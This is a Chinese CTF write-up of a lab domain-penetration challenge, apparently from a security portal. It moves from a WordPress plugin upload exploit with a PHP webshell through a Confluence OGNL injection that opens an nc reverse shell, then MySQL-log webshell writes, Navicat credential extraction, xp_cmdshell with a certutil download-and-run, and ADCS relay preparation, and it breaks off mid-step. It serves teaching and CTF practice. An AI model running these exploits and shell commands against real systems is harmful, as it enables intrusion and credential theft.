# ISOON2021 线下域渗透题解

阅读量 **204861**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2022-01-26 10:00:18

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p5.ssl.qhimg.com/t01e66c4fc3bee335ed.jpg)

## ISOON2021 线下域渗透题解

###  拓扑图

![](https://p5.ssl.qhimg.com/t011af99840a02d5218.png)

注:写wp的时候因为换过一次环境，所以ip可能会有所变化~

## 0x 01 web

<http://192.168.10.48/>

访问为一个wordpress

![](https://p4.ssl.qhimg.com/t017c18fd07de76d54d.png)

扫描目录，发现robots.txt

![](https://p2.ssl.qhimg.com/t01ecf47cdfccb61ba1.png)

发现存在插件wp-file-manager，通过搜索发现一个任意文件上传漏洞

<https://github.com/w4fz5uck5/wp-file-manager-0day/blob/master/elFinder.py>

    
    
    #!/usr/bin/env python2
    
    import requests
    import sys
    
    print("Usage: %s http://localhost" % sys.argv[0])
    
    burp0_url = "%s/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php" % sys.argv[1]
    burp0_headers = {"User-Agent": "curl/7.68.0", "Accept": "*/*", "Content-Type": "multipart/form-data; boundary=------------------------66e3ca93281c7050", "Expect": "100-continue", "Connection": "close"}
    burp0_data = "--------------------------66e3ca93281c7050\r\nContent-Disposition: form-data; name=\"cmd\"\r\n\r\nupload\r\n--------------------------66e3ca93281c7050\r\nContent-Disposition: form-data; name=\"target\"\r\n\r\nl1_Lw\r\n--------------------------66e3ca93281c7050\r\nContent-Disposition: form-data; name=\"upload[]\"; filename=\"x.php\"\r\nContent-Type: image/png\r\n\r\n\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x01^\x00\x00\x01^\x04\x03\x00\x00\x00?\x05j)\x00\x00\x00\x1ePLTE\xff\xff\xff\xef\xef\xef\xe5\xe5\xe5\xce\xce\xce\xa1\xa1\xa1iiiVVVGGG333\x00\x00\x00g\x00\xcc\xe2\x00\x00\r\xc0IDATx\xda\xed]K[\xdb\xc8\x12m\xc9\xce^\xc6\x90\xbb58\t\xdc\x9dm\x9c\t\xd9\xd9X\x1e\xc2\x8e\x87I\xc22\t!\x93\xe5@xmc\x02\xf1\xda\x0f\xa9\xff\xed]`\xeb\xddVU\xc9C\xb5\xe6\xa2-\xd4\xa7\xf2Q\xe9\xa8\x1fuN\x8b\xdf\xb9\xba\xee\x84\xbc\"^\xd7\x83\xc7\x8f\xbc\x9a\x08\xa7\xb1F\xbb\xaa\x97\xf4\xc8:5\xf2^L,A\xbb\x8cSr\xe4\x055\xd2\xbc\x17\x0eC\xbe\xe4H\xf3NL*\x8f\x8f\xd2i\xbe\xf05Y\xf05\xffM\xf5[*\x95J\xb9\xc1\xb7\xdc\xb4\x8f\xde\x9f\x1e\xf5\xec\x86\x95\x83\xfa\xadv\xff\x92\xd3\xcb\xfd\xba]\xd1\x86\x1f\x92Q2\xeck\x19\xb8\xdc\x93FB\xa4>\xf5[\xde\x91\x91k\xd2\xd1\x18\xdf\xeaG\x19\xbb\xdcCK\xd7\xfa-\x97\x12\x90\xb0.\xfcP>\x9629a-\xf9\xd7\xdc\x95\x8a\xcb\xdd\xd6\x11\xdf\x1d\xa9\xbc&5\xfd\xea\xf7\xe5@\x9d\xaf\xbc\xad\xe8\xc6\x0f\x85c9\xef:\xd0\x8c\x8d\x9d\xb9\xe9J\xa7\xa6\x17\xbe\xcb\x83\xf9\xf9\xca[\xad\xea\xd7\xd8MIW\xba-\x9d\xf8\xe1\x85L\xbdn-}\xf87\x1d^)eK\x1f|\x97\x01\xe9\xfa\x15\xcc_\xbf\x10x\xa5[\xd3\x85\x1f\n\x03H\xbe\xf2\\\x17\xfe}\x03JW\x8e+z\xe0k\x1c\xc3\xf2\x95m=\xea\xb7\x08LW\x8e\xf4\xe0\x87-h\xbe\xd3{1\xf3\xaf\t-\x07)\xf7t\xc0\x17\\\x0eR\xf6u\xa8\xdfux\xbe\x0f\x8b\xb7\xbc\xfc\x00\xfa\x16\x87\xbe\xc9\xbc\xfc\x0b\xfcX<\\\x9f\xf8\xf1E\x94\xef\x94\xd1x\xeb\xf7\r&\xdf\xb1\xc5\xce\x0f\x98\xf2\x95\xb2\xc6\xcd\xbf\xc6wT\xbe\xfb\xdc\xf8\x16P\xe9\xca\x9f\xdc\xf5\xbb\x8c\xcbw\xc4\xcd\x0f\x1b\xb8|\xc7\x163\xff\xbe\xc5\xe5\xeb\xd6x\xf15p\xf4 e\x8b\xb7~\x91\xf4 e\x9b\x97\x1f\xcc\x012\xdf\xbfy\xf9\x17IgR\xf6y\xf1]\xc6\xe6;\xe4\xad\xdfg\xd8|G\x16+?\xac`\xf3\x1d\xf3\xf2\xef::_^|\xb7\xb0\xf9:\x16k\xfd\xbe\xc5\xe6\xebV\xb2\xf0Yf|\xf1\xf9\xd6X\xf1\xc5~\x8e\xa5\xcc\x19\xbe2o\xf8\xd6\x84q\xc9\x87/%_\xf3k\x8e\xf8![=<>\xbe\xcc\xfc@\xe13\xce\xef\x1b\xe5{\xc1\x89\xef\x066\xdf\t/\xffR\xc6;\x9c\xf8\xaeP\xc6\xbf\x8c\xf8\xe2\xc7\xeb\xbc\xf3\x8b\"z>\xc4\x8b\xef#\xcf73\xe3\x8b\x9e\xcf\x12\xac\xf8\x1a\xc7\xc8|\x99\xd7w\x04a=\x8a\x13_\xf4z_\x85\x19\xdfW\xf8\xf5T\xce\xf1/e\xbd\x9as\xfc\x8b%\xb43\xc1\x8c/\x92 \xf6\xd8\xf7\xe7\xf1\xfbY\xbc\xfbo\xaf\xb0\xaf\x1b\xf3\xfe&j\x041\x14\xec\xfb\xc7\xe6\r\"\xdf\x03\xc1\xdf\x1f\xb5\x8b,_\xee\xfe(D\x01?tt1\xf7\x97<f?\xccB\xfa\xa3\x8e1\x83\x1d\r\xfaS\xd7\x11sc\x1d\xf0-\xe2\xca\x81\xbd\xbf\x0f\xbc'\xdb\x8eF\xf2\xe0+\xfe\xc0\xf5{\xb2\xf7\xa7\x16`\x9f\x8c\xcfB\x13|\xc5;\xd0\xcePM\xe8Q\xbfB\x14\x07\xf0\xb7M\x0b}\x00\xe0\x8ds\xeb\xde/\xe5\xd7\xb7,\xa7\x03|+4\xc2\xd7H\xad`\xb7\xb6\x88|\x17\xa6\x1fJ\xad\xe0sK\x11\xc9\x82o*\x07\x8f\x03z'-\xf4\xb1)z\xb2mu$\x0f\xbe\xf3_\xb9\x1f\xd6\x9cH\x16|\x85x\x9d\xfe%\xd6\x86\x1f\x84\x10\xc2Tr\xc4\xa4\x1d\xfe\xa5\x9a\xe8\xbb\x0b\xef@\xf2X}\xfc\t\xca\x1f\x93\xd3]\x9c^z\xc1\xfa\xf9$\x84\x9d\x8e\x05\x88d\xc1W\x88\xa5n\x94%~m\xc7#5\xf2\xd70\x9a\xa1\x9apz\x15h$\x0b\xbeB\x88B\xf3\xc3\x0c\xe3\xbb^\x03\x13\xc9\x81\xaf\x10B\x946\xedn\xf7\xa8kw\xd6p\xbf\x94\x07\xdfi\xceB\xfd\xd7\xbc\xf9\x1b\xe5\xcd'o\xfeFF\xde\xf0\xfd\xf2\xe7rVK\xb4k\xe9\xb4B\x8d\xbc\xa4\xde\xb3p/\xdc\xafG\xb4\xeb\xfd\xe0\xe8\xf1#'B\xdeS\xbd\xf4\xe45\xd5\xbf\xcf\xa5\xde\xf3\xda\x11\x0e\xd9K\xef\x94\x1c\xf9m\x8d\x1ay\x97\xb3\xf7\xed>\x83\x1f\xde\xd3\xf7\xed\xe9\xfb\xf6\xf4}\x8b\xfcimssss\xcd\xcaE\xfd\x1ae\xfb\xfd\xf5@J\xf7\xfe\xc8n\xe8?\xfe-\x07\xad\xf4\xeez\xab\xda\xe0\x9b<\xbfhF\x16/~u,\x8d\xf15^\x0f\xe26o\x15m\xeb\xd7\xf83ie(\xb6\x18\xa0\x0b?$\xa7+e\xcf\xd2\x92\r\xe5Rl\xc4\xaaP\x13|\xd5\xd6t\xee\xbe\x86\xf5[\x9c\xb3\x9d\xeb\xd4\xb5\xe3\x07s\xeef\xe3\xa8\xa2\x1b\xff\xbe\x9e\xbf\xb3t\xa8\x19\xbei\x9b\xfbA/H\x1d\xea\xf7\x1d|#W\x07~H\xdf\xda\x0f:\xff\xf1\xf3/\xa0u\xe2V#|!\x9d\x13>\xc0\xfc\xf5\xfbN\xa2:=\xb8\xf9\x01\xd6\xf9\xe3\xf5\"\xb0\xf3/\xb0\xf7\xf2\xb3&\xf8B\x9b\xc9\xc7\x96\x1e\xf5\x0b\xee\x0cl\xe9<?php system($_GET[\"cmd\"]); ?>\r\n--------------------------66e3ca93281c7050--\r\n"
    requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
    
    print("URL Shell: %s/wp-content/plugins/wp-file-manager/lib/files/x.php?cmd=<CMD>")
    while True:
    
        cmd = raw_input("$ ")
        burp0_url = "%s/wp-content/plugins/wp-file-manager/lib/files/x.php?cmd=%s" % (sys.argv[1], cmd)
        burp0_headers = {"User-Agent": "curl/7.68.0", "Accept": "*/*", "Expect": "100-continue", "Connection": "close"}
        r = requests.get(burp0_url, headers=burp0_headers)
        print(r.text)
    
    
    
    python2  .\wp-file-manager.py http://192.168.10.48/
    

![](https://p2.ssl.qhimg.com/t012c603823e85f8395.png)

**上线msf**

    
    
    use exploit/multi/script/web_delivery
    set target 2
    set payload windows/x64/meterpreter/reverse_tcp
    set lhost 172.168.1.128
    set lport 4444
    run
    

![](https://p4.ssl.qhimg.com/t014daf0d323649d465.png)

查看内网网段

    
    
    run get_local_subnets
    

![](https://p5.ssl.qhimg.com/t0122b5161d5559ba87.png)

双网卡

挂路由，扫描内网存活主机

    
    
    run autoroute -s 10.1.16.0/24
    auxiliary/scanner/portscan/tcp
    

扫描top100

    
    
    22,3389,3306,1433,21,25,8080,80,81,8081,7001,8000,8088,8888,9090,8090,88,8001,82,9080,8082,8089,9000,8443,9999,8002,89,8083,8200,8008,90,8086,801,8011,8085,9001,9200,8100,8012,85,8084,8070,7002,8091,8003,99,7777,8010,443,8028,8087,83,7003,10000,808,38888,8181,800,18080,8099,8899,86,8360,8300,8800,8180,3505,7000,9002,8053,1000,7080,8989,28017,9060,888,3000,8006,41516,880,8484,6677,8016,84,7200,9085,5555,8280,7005,1980,8161,9091,7890,8060,6080,6379,8880,8020,7070,889,8881,9081,8009,7007,8004,38501,1010
    

![](https://p4.ssl.qhimg.com/t01f8ece47ec1e4ab7c.png)

发现存活主机

    
    
    [+] 10.1.16.67:           - 10.1.16.67:445 - TCP OPEN
    [+] 10.1.16.69:           - 10.1.16.69:22 - TCP OPEN
    [+] 10.1.16.69:           - 10.1.16.69:3306 - TCP OPEN
    [+] 10.1.16.80:           - 10.1.16.80:139 - TCP OPEN
    [+] 10.1.16.69:           - 10.1.16.69:8090 - TCP OPEN
    [+] 10.1.16.68:           - 10.1.16.68:135 - TCP OPEN
    [+] 10.1.16.70:           - 10.1.16.70:80 - TCP OPEN
    [+] 10.1.16.67:           - 10.1.16.67:135 - TCP OPEN
    [+] 10.1.16.68:           - 10.1.16.68:139 - TCP OPEN
    [+] 10.1.16.68:           - 10.1.16.68:445 - TCP OPEN
    [+] 10.1.16.70:           - 10.1.16.70:135 - TCP OPEN
    [+] 10.1.16.80:           - 10.1.16.80:135 - TCP OPEN
    [+] 10.1.16.80:           - 10.1.16.80:445 - TCP OPEN
    [+] 10.1.16.80:           - 10.1.16.80:80 - TCP OPEN
    [+] 10.1.16.68:           - 10.1.16.68:8080 - TCP OPEN
    [+] 10.1.16.70:           - 10.1.16.70:139 - TCP OPEN
    [+] 10.1.16.66:           - 10.1.16.66:135 - TCP OPEN
    [+] 10.1.16.66:           - 10.1.16.66:445 - TCP OPEN
    [+] 10.1.16.82:           - 10.1.16.82:139 - TCP OPEN
    [+] 10.1.16.67:           - 10.1.16.67:139 - TCP OPEN
    [+] 10.1.16.68:           - 10.1.16.68:3306 - TCP OPEN
    [+] 10.1.16.68:           - 10.1.16.68:80 - TCP OPEN
    [+] 10.1.16.71:           - 10.1.16.71:445 - TCP OPEN
    [+] 10.1.16.70:           - 10.1.16.70:445 - TCP OPEN
    [+] 10.1.16.71:           - 10.1.16.71:135 - TCP OPEN
    [+] 10.1.16.71:           - 10.1.16.71:80 - TCP OPEN
    [+] 10.1.16.71:           - 10.1.16.71:139 - TCP OPEN
    [+] 10.1.16.66:           - 10.1.16.66:139 - TCP OPEN
    [+] 10.1.16.82:           - 10.1.16.82:80 - TCP OPEN
    

## 0x02 wiki

设置代理

上传frp到windows上  
frps.ini

    
    
    [common]
    bind_port = 7000
    vhost_http_port = 10080
    vhost_https_port = 10443
    allow_ports = 1000-50000
    

攻击机运行frps

    
    
    ./frps -c frps.ini
    

![](https://p3.ssl.qhimg.com/t016e449d1fc0e040f9.png)

frpc.ini

    
    
    [common]
    server_addr = 172.168.1.128
    server_port = 7000
    
    
    [socks1]
    type = tcp
    remote_port = 6666
    plugin = socks5
    
    [msf]
    type = tcp
    local_ip = 127.0.0.1
    local_port = 5555
    remote_port = 7002
    

目标机器运行frpc

![](https://p2.ssl.qhimg.com/t01522ece544eeac71c.png)

访问8090，发现是一个confluence，Confluence 是 Atlassian 公司出品的一款专业的企业知识管理与协同软件。

参考CVE-2021-26084

vulhub上的poc:

    
    
    POST /pages/doenterpagevariables.action HTTP/1.1
    Host: 192.168.10.129:8000
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 1060
    Origin: http://192.168.10.129:8000
    Connection: close
    Referer: http://192.168.10.129:8000/pages/doenterpagevariables.action
    Cookie: JSESSIONID=67C450235CD839CF8F51DC9E4541FE44
    Upgrade-Insecure-Requests: 1
    
    queryString=%5cu0027%2b%7bClass.forName%28%5cu0027javax.script.ScriptEngineManager%5cu0027%29.newInstance%28%29.getEngineByName%28%5cu0027JavaScript%5cu0027%29.%5cu0065val%28%5cu0027var+isWin+%3d+java.lang.System.getProperty%28%5cu0022os.name%5cu0022%29.toLowerCase%28%29.contains%28%5cu0022win%5cu0022%29%3b+var+cmd+%3d+new+java.lang.String%28%5cu0022                               id                                                       %5cu0022%29%3bvar+p+%3d+new+java.lang.ProcessBuilder%28%29%3b+if%28isWin%29%7bp.command%28%5cu0022cmd.exe%5cu0022%2c+%5cu0022%2fc%5cu0022%2c+cmd%29%3b+%7d+else%7bp.command%28%5cu0022bash%5cu0022%2c+%5cu0022-c%5cu0022%2c+cmd%29%3b+%7dp.redirectErrorStream%28true%29%3b+var+process%3d+p.start%28%29%3b+var+inputStreamReader+%3d+new+java.io.InputStreamReader%28process.getInputStream%28%29%29%3b+var+bufferedReader+%3d+new+java.io.BufferedReader%28inputStreamReader%29%3b+var+line+%3d+%5cu0022%5cu0022%3b+var+output+%3d+%5cu0022%5cu0022%3b+while%28%28line+%3d+bufferedReader.readLine%28%29%29+%21%3d+null%29%7boutput+%3d+output+%2b+line+%2b+java.lang.Character.toString%2810%29%3b+%7d%5cu0027%29%7d%2b%5cu0027
    

![](https://p1.ssl.qhimg.com/t0150c78be294cf3e9f.png)

​
这里发现发现机器是centos,在linux上Confluence的默认权限为confluence，没有写权限，所以我们这里没办法直接写webshell了。但是这里可以利用centos上的nc先拿到一共shell进行操作。

上传lcx.exe进行端口转发

    
    
    start /min lcx.exe -tran 7777 172.168.1.128 3333
    

![](https://p5.ssl.qhimg.com/t01a58dd09072b3c53a.png)

    
    
    POST /pages/doenterpagevariables.action HTTP/1.1
    Host: 192.168.10.129:8000
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 1159
    Origin: http://192.168.10.129:8000
    Connection: close
    Referer: http://192.168.10.129:8000/pages/doenterpagevariables.action
    Cookie: JSESSIONID=67C450235CD839CF8F51DC9E4541FE44
    Upgrade-Insecure-Requests: 1
    
    queryString=%5cu0027%2b%7bClass.forName%28%5cu0027javax.script.ScriptEngineManager%5cu0027%29.newInstance%28%29.getEngineByName%28%5cu0027JavaScript%5cu0027%29.%5cu0065val%28%5cu0027var+isWin+%3d+java.lang.System.getProperty%28%5cu0022os.name%5cu0022%29.toLowerCase%28%29.contains%28%5cu0022win%5cu0022%29%3b+var+cmd+%3d+new+java.lang.String%28%5cu0022                            nc -e /bin/bash 10.1.16.68 7777                                          %5cu0022%29%3bvar+p+%3d+new+java.lang.ProcessBuilder%28%29%3b+if%28isWin%29%7bp.command%28%5cu0022cmd.exe%5cu0022%2c+%5cu0022%2fc%5cu0022%2c+cmd%29%3b+%7d+else%7bp.command%28%5cu0022bash%5cu0022%2c+%5cu0022-c%5cu0022%2c+cmd%29%3b+%7dp.redirectErrorStream%28true%29%3b+var+process%3d+p.start%28%29%3b+var+inputStreamReader+%3d+new+java.io.InputStreamReader%28process.getInputStream%28%29%29%3b+var+bufferedReader+%3d+new+java.io.BufferedReader%28inputStreamReader%29%3b+var+line+%3d+%5cu0022%5cu0022%3b+var+output+%3d+%5cu0022%5cu0022%3b+while%28%28line+%3d+bufferedReader.readLine%28%29%29+%21%3d+null%29%7boutput+%3d+output+%2b+line+%2b+java.lang.Character.toString%2810%29%3b+%7d%5cu0027%29%7d%2b%5cu0027
    

![](https://p3.ssl.qhimg.com/t01b3af951a3ea037fe.png)

    
    
    python -c "import pty;pty.spawn('/bin/bash')"
    

之后可以再上线msf，先做端口转发:

    
    
    start /min lcx.exe -tran 8888 172.168.1.128 1111
    

![](https://p2.ssl.qhimg.com/t018feb3dc7e4bfcfb3.png)

![](https://p5.ssl.qhimg.com/t019ff5a3b45f3bb88c.png)

    
    
    msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.1.16.68 LPORT=8888 -f elf > test7002.elf
    

tmp目录是所有用户共有的临时文件夹，所有用户都拥有读写权限，所以可以将elf写到/tmp下执行。

![](https://p5.ssl.qhimg.com/t0126c6f4d76ffac426.png)

![](https://p2.ssl.qhimg.com/t01bddf2cf13237dc27.png)

本机的信息收集，查看数据库账号密码:

    
    
    cat /var/atlassian/application-data/confluence/confluence.cfg.xml
    
    
    
    <property name="hibernate.connection.password">2021ISoon!@#</property>
        <property name="hibernate.connection.url">jdbc:mysql://localhost:3306/confluence?useUnicode=true&amp;characterEncoding=UTF-8&amp;useSSL=false&amp;sessionVariables=tx_isolation='READ-COMMITTED'</property>
        <property name="hibernate.connection.username">confluenceuser</property>
    

![](https://p4.ssl.qhimg.com/t016a67c938744944e8.png)

得到账号密码为

    
    
    confluenceuser   2021ISoon!@#
    

![](https://p1.ssl.qhimg.com/t01afd1c2de0236679c.png)

查看用户信息

    
    
    select id,user_name,credential from cwd_user;
    

![](https://p5.ssl.qhimg.com/t01410b187c4fea1e01.png)

发现confluence里的密码是加密的，但是我们这里可以重置后台账号密码:

    
    
    UPDATE cwd_user SET credential= '{PKCS5S2}UokaJs5wj02LBUJABpGmkxvCX0q+IbTdaUfxy1M9tVOeI38j95MRrVxWjNCu6gsm' WHERE id = 229377;
    

之后使用isoon2021admin/123456登录后台即可

公告栏获得 flag。

![](https://p4.ssl.qhimg.com/t0179a395737174bb32.png)

得到oa用户和密码

![](https://p2.ssl.qhimg.com/t01d1035e2f61dee479.png)

## 0x03 OA

10.1.16.70

先看看OA的版本11.7:

![](https://p0.ssl.qhimg.com/t019673373f4ac11335.png)

​ 根据拿到的文档表，使用权限高的用户登录。11.7版本后台getshell方法有好几种: **上传.user.ini** 、
**redis+SSRF组合拳** 、 **后台sql注入添加用户写weshsell** ，这里可以任意选择一种方式拿到webshell。

演示后台sql注入添加用户写weshsell，添加用户:

    
    
    http://10.1.16.70/general/hr/manage/query/delete_cascade.php?condition_cascade=grant all privileges ON mysql.* TO 'cyzcc'@'%' IDENTIFIED BY 'abcABC@123' WITH GRANT OPTION
    

远程连接

    
    
    mysql -u cyzcc -p -h 10.1.16.70 -P 3336
    

![](https://p5.ssl.qhimg.com/t01365dde03deffe83c.png)

然后该用户是对mysql数据库拥有所有权限的,然后给自己加权限：

    
    
    UPDATE `mysql`.`user` SET `Password` = '*DE0742FA79F6754E99FDB9C8D2911226A5A9051D', `Select_priv` = 'Y', `Insert_priv` = 'Y', `Update_priv` = 'Y', `Delete_priv` = 'Y', `Create_priv` = 'Y', `Drop_priv` = 'Y', `Reload_priv` = 'Y', `Shutdown_priv` = 'Y', `Process_priv` = 'Y', `File_priv` = 'Y', `Grant_priv` = 'Y', `References_priv` = 'Y', `Index_priv` = 'Y', `Alter_priv` = 'Y', `Show_db_priv` = 'Y', `Super_priv` = 'Y', `Create_tmp_table_priv` = 'Y', `Lock_tables_priv` = 'Y', `Execute_priv` = 'Y', `Repl_slave_priv` = 'Y', `Repl_client_priv` = 'Y', `Create_view_priv` = 'Y', `Show_view_priv` = 'Y', `Create_routine_priv` = 'Y', `Alter_routine_priv` = 'Y', `Create_user_priv` = 'Y', `Event_priv` = 'Y', `Trigger_priv` = 'Y', `Create_tablespace_priv` = 'Y', `ssl_type` = '', `ssl_cipher` = '', `x509_issuer` = '', `x509_subject` = '', `max_questions` = 0, `max_updates` = 0, `max_connections` = 0, `max_user_connections` = 0, `plugin` = 'mysql_native_password', `authentication_string` = '', `password_expired` = 'Y' WHERE `Host` = Cast('%' AS Binary(1)) AND `User` = Cast('cyzcc' AS Binary(5));
    

然后用注入点刷新权限，因为该用户是没有刷新权限的权限的：`general/hr/manage/query/delete_cascade.php?condition_cascade=flush
privileges;`

![](https://p3.ssl.qhimg.com/t01e23361782bbf4cb7.png)

提示这个，或者让改密码死活改不了。再执行一下

![](https://p0.ssl.qhimg.com/t010bc5781b93d050c1.png)

    
    
    grant all privileges ON mysql.* TO 'cyzcc'@'%' IDENTIFIED BY 'abcABC@123' WITH GRANT OPTION
    

之后就拥有了所有权限

![](https://p1.ssl.qhimg.com/t01c0852929ddad08d8.png)

写马

    
    
    # 查路径：
    select @@basedir; # c:\MYOA\mysql5\，那么web目录就是c:\MYOA\webroot    # 方法1：
    set global slow_query_log=on;
    set global slow_query_log_file='C:/MYOA/webroot/cyzcc.php';
    select '<?php eval($_POST[x]);?>' or sleep(11);
    # 方法2：
    set global general_log = on;
    set global general_log_file = 'C:/MYOA/webroot/cyzcc.php';
    select '<?php eval($_POST[x]);?>';
    show variables like '%general%';
    

![](https://p5.ssl.qhimg.com/t01007ac8fdc66dd501.png)

![](https://p1.ssl.qhimg.com/t0197c67e333d446b1a.png)

![](https://p0.ssl.qhimg.com/t01d52523628ac7677c.png)

![](https://p4.ssl.qhimg.com/t015880097e01ed5dc7.png)

上去是system权限，这里本来还想考察一个com组件绕过disable_functions。

![](https://p3.ssl.qhimg.com/t01bbf91016a3f760cd.png)

上线msf,正向shell：

    
    
    msfvenom -p windows/meterpreter/bind_tcp LPORT=1234 -f exe  > bind_shell.exe
    

将bind_shell.exe上传到oa机器，运行即可收到bind shell

![](https://p0.ssl.qhimg.com/t01e28fbcde11711e1d.png)

为了方便之后的操作，我们将shell转到CS上操作:

翻一下桌面找到flag:

![](https://p4.ssl.qhimg.com/t013aaac66d1ca48828.png)

​ 本机信息收集，在C盘根目录下看到了服务器安装了Navicat,猜测Navicat里可能保存了数据库的账号和密码。

![](https://p5.ssl.qhimg.com/t01391c3be26d2cff88.png)

Navicat 中保存的所有连接账密，都是直接存到对应注册表项值下的。

各个数据库连接账密具体存放位置:

    
    
    MySQL HKEY_CURRENT_USER\Software\PremiumSoft\Navicat\Servers\
    MariaDB HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMARIADB\Servers\
    Microsoft SQL HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMSSQL\Servers\
    Oracle HKEY_CURRENT_USER\Software\PremiumSoft\NavicatOra\Servers\
    PostgreSQL HKEY_CURRENT_USER\Software\PremiumSoft\NavicatPG\Servers\
    MongoDB HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMongoDB
    SQLite HKEY_CURRENT_USER\Software\PremiumSoft\NavicatSQLite\Servers\
    

​ 但是我们这里直接在system权限下进行查询是查不到的。尝试查询当前用户的所有连接记录:

![](https://p3.ssl.qhimg.com/t01047217fd287af362.png)

​
system进程、服务若要操作用户注册表（HKEY_CURRENT_USER）,如果直接操作注册表会被重定向到HKEY_USERS。所以我们这里需要进行从sys-admin的降权操作。

这里利用Cobalt Strike的进程注入实现降权(msf同理)：

查看具有administrator权限的系统进程

    
    
    tasklist /v /fo list
    

将Payload注入到新进程中去：

    
    
    inject 5732 x64
    

获得一个administrator权限的beacon。

查询mssql的连接账密

    
    
    # reg query HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMSSQL\Servers\ /s /v host 数据库连接 ip
    # reg query HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMSSQL\Servers\ /s /v UserName 数据库用户名
    # reg query HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMSSQL\Servers\ /s /v pwd 数据库用户名对应的密码 hash
    # reg query HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMSSQL\Servers\ /s /v Port 数据库连接端口，默认 16 进制数值
    

之后，我们把拿到的hash复制回来本地解密即可。

其实有一键化的工具可以直接跑：

<https://github.com/uknowsec/SharpDecryptPwd>

![](https://p1.ssl.qhimg.com/t0166cf5f84259f8c3a.png)

## 0x04 db.iSoon2021.lab

​ 本地挂上代理，使用navicat连接内网mssql，启用目标 mssql 的 xp_cmdshell可以执行命令。

    
    
    exec master.dbo.xp_cmdshell 'whoami';
    

![](https://p5.ssl.qhimg.com/t01a81bd20a5f96f4bb.png)

​ 发现权限是一个受限的service\mssql$sqlexpress服务账户权限,但是在域里， **服务的权限为Local System 或
Network Service都会注册在活动目录的机器帐户下** ，所以我们我们这里其实已经入域了。

![](https://p1.ssl.qhimg.com/t0199cce3423914ef7f.png)

通过使用certutil.exe下载远程的可执行文件，可执行文件可以放在OA服务器或者wordpress上。

    
    
    exec master.dbo.xp_cmdshell 'cd c:\\test & certutil -urlcache -split -f http://10.10.211.142/beacon999.exe';
    

执行程序，反弹到CS上操作。

    
    
    exec master.dbo.xp_cmdshell 'cd c:\\test & beacon999.exe';
    

Network Service( **NT AUTHORITY\Network Service** )属于Windows服务的登陆账户，拥有
**SeImpersonatePrivilege** 权限，所以这里是可以利用potato进行提权操作。

但是这里需要注意要提权的机器是不出网的，所以我们这里要想反弹shell，还需要经过端口转发或者在入口点经过http代理上线CS或者MSF。

![](https://p1.ssl.qhimg.com/t01e1e58502fbe508cb.png)

这里其实不提权也可以，不妨碍对域进行攻击。

## 0x05 dc2.net.iSoon2021.lab

简单域信息收集。发现域内一共就三台机器，其中两台域控，一台db服务器。

![](https://p2.ssl.qhimg.com/t015d939f00a8b7057c.png)

所以更多的往能够直接打域控的方式上靠。

常见的域提权方式:

  * 权限配置不当:ACL,DNSadmin,GPO等等
  * 组策略GPP和SYSVOL中的密码
  * kerberosating
  * zerologon
  * ms14-068
  * 基于委派的测试
  * printNightmare
  * relay

如果这里信息收集没找到adcs服务的话:

​
回到我们现在受控的db服务器上面进行信息收集，提到system权限后，然后降权，发现机器上面有火狐浏览器，降权之后抓一下历史记录，(或者直接3389连上去找)可以看到:

![](https://p4.ssl.qhimg.com/t01eb5dfc3907273d41.png)

访问发现是域证书服务，可以使用certutil命令来定位域内的CA服务器

    
    
    certutil -CA
    

![](https://p5.ssl.qhimg.com/t01923e438527a12498.png)

​ 发现在DC1上安装域证书服务，想到今年blackhat2021公开的关于ADCS的攻击方式，其中国内讨论较多的可能就是ADCS ESC8
也被叫做ADCS Relay，是目前ADCS里面利用最广的一个洞。

    
    
    由于ADCS的http证书接口没有启用NTLM中继保护，因此其易受NTLM Relay攻击。而且Authorization HTTP 标头明确只允许通过 NTLM 身份验证，因此Kerberos协议无法使用。因此，攻击者可以利用NTLM Relay攻击ADCS证书服务。
    

具体可以参考白皮书:

<https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf>

**ADCS大致攻击思路:**

  * 攻击者利用漏洞，强制域控使用机器账户发起ntlm认证请求
  * 之后将请求relay到证书服务的http接口，通过验证获得域机器账户的身份
  * 利用证书模板为机器用户申请证书，方便之后持久性获取该用户权限
  * 最后利用申请到的证书进行认证，就能拿到机器用户也就是域控的权限。

**但是我们这里利用有几个问题需要解决:**

​ 一是我们这里探测发现打印机服务是关闭的，这里需要利用加密文件系统 (EFS) 的RPC协议。和之前的`printer bug`利用类似，EFS 的
rpc，允许恶意`域用户/或机器账号`控制`其它机器`外发认证.

​
二是我们这里想要进行relay攻击需要利用工具来监听本地445端口，而在windows上445端口是占用的，并且目标机器在内网，且不出网，所以我们这里需要进行流量重定向和端口转发操作。

如果受控机上线了CS，可以直接使用PortBender这个插件:

[PortBender：一款功能强大的TCP端口重定向工具 –
FreeBuf网络安全行业门户](https://www.freebuf.com/articles/network/305106.html)

首先把受控机的445端口流量重定向到受控机自己的8445端口，

首先需要把驱动传到当前shell目录下

    
    
    upload xxxx.sys
    

执行重定向

    
    
    PortBender redirect 445 8445
    

![](https://p3.ssl.qhimg.com/t01ad73f391ee6089b9.png)

